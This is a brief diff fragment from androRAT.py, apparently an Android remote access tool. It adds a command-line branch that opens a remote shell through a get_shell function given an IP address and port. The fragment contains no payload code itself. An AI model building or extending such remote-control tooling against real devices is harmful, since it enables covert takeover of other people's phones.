@@ -63,3 +63,12 @@ if args.build:
             print(stdOutput("error") + "\033[1mArguments Missing")
 
 # Part 4: End of androRAT.py
+# Part 5: Start of androRAT.py
+
+if args.shell:
+    if args.ip and args.port:
+        get_shell(args.ip, args.port)
+    else:
+        print(stdOutput("error") + "\033[1mArguments Missing")
+
+# Part 5: End of androRAT.py
